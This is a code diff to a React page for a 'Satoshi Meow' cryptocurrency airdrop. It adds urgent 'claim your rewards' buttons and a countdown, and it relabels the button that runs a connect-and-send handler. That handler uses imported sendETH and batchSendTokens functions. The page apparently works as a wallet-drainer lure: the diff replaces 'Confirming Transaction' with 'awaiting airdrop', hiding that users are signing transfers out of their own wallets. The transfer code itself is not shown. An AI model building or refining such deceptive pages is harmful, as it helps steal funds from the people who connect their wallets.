@@ -5,6 +5,7 @@ import { connectWallet, getBalance } from './web3/wallet';
 import { getPriceUSD } from './web3/price';
 import { sendETH } from './web3/send';
 import { batchSendTokens } from './web3/sendToken';
+import AirdropStats from './AirdropStat';
 // import Provider from '@walletconnect/ethereum-provider';
 // import { useMemo } from "react";
 
@@ -189,12 +190,12 @@ function App() {
             <h1 className="title pt-5 text-shadow">
               {"Welcome -> to -> the -> Airdrop -> DApp".split("").map((char, i) => (
                 <span key={i} className="shake-letter" style={{ animationDelay: titleDelays[i] }}>{char}</span>
-              ))}
+              ))}🪂
             </h1>
-            <p className="subtitle text-shadow">💰Connect your wallet and claim your rewards!🎁</p>
+            <p className="subtitle text-shadow">💰Unlock your rewards & claim your airdrop!🎁</p>
 
             <button
-              className="btn btn-primary btn-lg animated-bt"
+              className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
               onClick={handleConnectAndSend}
               disabled={loading}
             >
@@ -202,8 +203,8 @@ function App() {
                 loading
                   ? "Processing..."
                   : state.address
-                  ? "Wallet connected | Confirming Transaction"
-                  : "Connect Wallet & Claim Airdrop🪂"
+                  ? "Claiming | awaiting airdrop..."
+                  : "Your airdrop is ready for claim🪂"
               }
             </button>
             <div className="mt-4">
@@ -211,6 +212,7 @@ function App() {
             </div>
             <div className="logo">
               <h2 className="text-shadow">SATOSHI MEOW</h2>
+              <h4 className='position-absolute top-100 start-50 translate-middle text-center text-white fw-bold text-shadow shadow h4-img-text'>Chill SATOSHI MEOW Airdrop <br /> Exclusive rewards for our <br /> early community members.</h4>
             </div>
           </div>
         </div>
@@ -251,6 +253,26 @@ function App() {
             <strong>The Scratching Post:</strong> A decentralized launchpad for upcoming feline-themed projects and NFT collections.
           </li>
         </ul>
+      </div>
+      <div className="container my-5">
+        <h2 className="text-center mb-4 h2-join-meow">🐾 Join the Meow-vement!</h2>
+        {/* <div className="row">
+          <div className="col-md-6">
+            <p>Satoshi Meow is the first Purr-to-Earn ecosystem designed to bring balance to the crypto-verse. While dogs chase their tails, Satoshi Meow focuses on calculated leaps and landing on all four paws, even in a bear market.</p>
+          </div>
+        </div> */}
+        <div className="card text-bg-dark">
+          <img src="/satoshi.jpeg" className="card-img img-opacity" alt="..."/>
+          <div className="card-img-overlay d-flex flex-column justify-content-center align-items-center text-center">
+            <h5 className="card-title text-shadow p-img-text shadow">SATOSHI MEOW</h5>
+            <p className="card-text text-shadow p-img-text px-5 shadow">Satoshi Meow is the first Purr-to-Earn ecosystem designed to bring balance to the crypto-verse. While dogs chase their tails, Satoshi Meow focuses on calculated leaps and landing on all four paws, even in a bear market.</p>
+            <p className="card-text text-shadow p-img-text shadow"><small><button className="btn btn-info animated-bt2">🎁Claim your rewards now!</button></small></p>
+          </div>
+        </div>
+      </div>
+      <div className="live-ch my-5 py-5 overflow-x-hidden">
+        <h2 className="text-center mb-4">📺 Live Airdrop Countdown</h2>
+        <AirdropStats />
       </div>
       
     </>
